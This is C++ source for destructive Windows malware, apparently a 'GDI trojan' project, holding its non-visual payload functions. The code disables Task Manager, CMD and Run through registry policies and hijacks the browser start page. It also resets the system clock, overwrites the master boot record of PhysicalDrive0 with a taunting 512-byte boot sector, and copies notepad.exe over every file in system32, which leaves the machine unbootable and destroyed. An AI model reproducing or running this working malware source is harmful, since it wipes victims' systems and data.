/*
 * Every non visual Payload is here!
*/

#include "functions.h"

namespace Payloads {
	
	void prepareForImpact(){
		
		DWORD value = 0x00000001;
		
		const char* regValues[5] = {"NoClose", "StartMenuLogOff", "NoRun", "DisableTaskMgr", "DisableCMD",};
		const char startPage[] = "https://github.com/LunzRh";
		const char typedUrl[] = "How develop cool gdi trojan for Windows XP 2077 cyberpunk updated 100% working no trolls";
		
		
		// Registry operations
		Functions::setRegKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", regValues[0], REG_DWORD, (const BYTE*)&value, sizeof(value));
		Functions::setRegKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", regValues[1], REG_DWORD, (const BYTE*)&value, sizeof(value));
		Functions::setRegKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", regValues[2], REG_DWORD, (const BYTE*)&value, sizeof(value));
		Functions::setRegKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\Main", "Start Page", REG_SZ, (LPBYTE)&startPage, sizeof(startPage));
		Functions::setRegKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\TypedURLs", "url1", REG_SZ, (LPBYTE)&typedUrl, sizeof(typedUrl));
		Functions::createAndSetRegKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", regValues[3], REG_DWORD, (const BYTE*)&value, sizeof(value));
		Functions::createAndSetRegKey(HKEY_CURRENT_USER, "SOFTWARE\\Policies\\Microsoft\\Windows\\System", regValues[4], REG_DWORD, (const BYTE*)&value, sizeof(value));
		
		// Load menu modifications
		ShellExecuteA(NULL, NULL, "taskkill", "/f /im explorer.exe", NULL, 0);
		Sleep(500);
		ShellExecuteA(NULL, NULL, "explorer.exe", NULL, NULL, 0);
	}
	
	int whatDayIsToday(){
		SYSTEMTIME systemTime;
		
		GetSystemTime(&systemTime);
		
		if (systemTime.wYear == 2000 && systemTime.wMonth == 1 && systemTime.wDay == 2)
			return 1;
		else if (systemTime.wYear == 2000 && systemTime.wMonth == 1 && systemTime.wDay == 1){
			systemTime.wYear = 1900;
			systemTime.wMonth = 1;
			systemTime.wDay = 1;
			SetSystemTime(&systemTime);
			return 2;
		} else
			return 3;
	}
	
	void byeByeBoot(){
		const unsigned char bootloader[512] = {
			0xFA, 0x68, 0x00, 0xA0, 0x07, 0x31, 0xFF, 0xB8, 0x13, 0x00, 0xCD, 0x10,
			0xB9, 0x15, 0x00, 0xE8, 0xB8, 0x00, 0xBE, 0xD3, 0x7C, 0xB2, 0x0C, 0xB6,
			0x0A, 0xE8, 0x97, 0x00, 0xE8, 0x9C, 0x00, 0xB9, 0x15, 0x00, 0xE8, 0xA5,
			0x00, 0xBE, 0xE3, 0x7C, 0xB2, 0x06, 0xB6, 0x0C, 0xE8, 0x84, 0x00, 0xE8,
			0x89, 0x00, 0xB9, 0x15, 0x00, 0xE8, 0x92, 0x00, 0x30, 0xD2, 0x30, 0xF6,
			0xE8, 0x74, 0x00, 0xBE, 0x01, 0x7D, 0xB3, 0x07, 0xB4, 0x0E, 0xAC, 0xCD,
			0x10, 0x08, 0xC0, 0x75, 0xF7, 0x80, 0xC2, 0x10, 0xE8, 0x60, 0x00, 0x30,
			0xE4, 0xCD, 0x16, 0x3C, 0x08, 0x74, 0x34, 0x3C, 0x0D, 0x74, 0x27, 0x80,
			0xFA, 0x27, 0x7D, 0x22, 0x3C, 0x1B, 0x74, 0x2E, 0x3C, 0x36, 0x74, 0x2F,
			0x3C, 0x39, 0x74, 0x30, 0x3C, 0x09, 0x74, 0x31, 0xB4, 0x0A, 0x30, 0xFF,
			0xB3, 0x0F, 0xB9, 0x01, 0x00, 0xCD, 0x10, 0xFE, 0xC2, 0xE8, 0x2F, 0x00,
			0xEB, 0xCD, 0x30, 0xD2, 0xFE, 0xC6, 0xE8, 0x26, 0x00, 0xEB, 0xC4, 0xFE,
			0xCA, 0xE8, 0x1F, 0x00, 0xEB, 0xBD, 0xBE, 0x12, 0x7D, 0xEB, 0x0D, 0xBE,
			0x2D, 0x7D, 0xEB, 0x08, 0xBE, 0x48, 0x7D, 0xEB, 0x03, 0xBE, 0x68, 0x7D,
			0x30, 0xD2, 0x30, 0xF6, 0xE8, 0x04, 0x00, 0xE8, 0x09, 0x00, 0xF4, 0xFA,
			0xB4, 0x02, 0xB7, 0x00, 0xCD, 0x10, 0xC3, 0xFA, 0xB3, 0x21, 0xB4, 0x0E,
			0xAC, 0xFE, 0xC3, 0xCD, 0x10, 0x08, 0xC0, 0x75, 0xF5, 0xC3, 0xFA, 0xB4,
			0x86, 0xBA, 0x00, 0x00, 0xCD, 0x15, 0xC3, 0x48, 0x61, 0x70, 0x70, 0x79,
			0x20, 0x6E, 0x65, 0x77, 0x20, 0x59, 0x65, 0x61, 0x72, 0x21, 0x00, 0x45,
			0x6E, 0x6A, 0x6F, 0x79, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x75, 0x73,
			0x65, 0x6C, 0x65, 0x73, 0x73, 0x20, 0x70, 0x61, 0x79, 0x6C, 0x6F, 0x61,
			0x64, 0x2E, 0x2E, 0x2E, 0x00, 0x54, 0x79, 0x70, 0x65, 0x20, 0x73, 0x6F,
			0x6D, 0x65, 0x74, 0x68, 0x69, 0x6E, 0x67, 0x3A, 0x20, 0x00, 0x59, 0x6F,
			0x75, 0x20, 0x66, 0x69, 0x6E, 0x64, 0x20, 0x61, 0x20, 0x45, 0x61, 0x73,
			0x74, 0x65, 0x72, 0x45, 0x67, 0x67, 0x2C, 0x20, 0x4F, 0x4D, 0x47, 0x21,
			0x00, 0x54, 0x68, 0x69, 0x73, 0x20, 0x43, 0x6F, 0x64, 0x65, 0x20, 0x69,
			0x73, 0x20, 0x73, 0x6F, 0x20, 0x62, 0x75, 0x67, 0x67, 0x79, 0x2E, 0x20,
			0x3E, 0x3A, 0x43, 0x00, 0x49, 0x20, 0x72, 0x65, 0x61, 0x6C, 0x6C, 0x79,
			0x20, 0x68, 0x61, 0x74, 0x65, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x6D,
			0x62, 0x72, 0x20, 0x70, 0x61, 0x79, 0x6C, 0x6F, 0x61, 0x64, 0x2E, 0x00,
			0x59, 0x6F, 0x75, 0x27, 0x72, 0x65, 0x20, 0x76, 0x65, 0x72, 0x79, 0x20,
			0x67, 0x61, 0x79, 0x2E, 0x20, 0x42, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
		};

		DWORD bWriten;
		
		HANDLE mbr = CreateFileA(TEXT("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
		WriteFile(mbr, bootloader, 512, &bWriten, NULL);
		CloseHandle(mbr);
	}
	
	void notepadOverwriter(){
		WIN32_FIND_DATA data;
		HANDLE hFindFile;
		
		SetCurrentDirectory("C:\\windows\\system32");
		hFindFile = FindFirstFileA("*", &data);
		
		do {
			CopyFile("C:\\Windows\\notepad.exe", data.cFileName, FALSE);
		} while (FindNextFileA(hFindFile, &data));
	}
}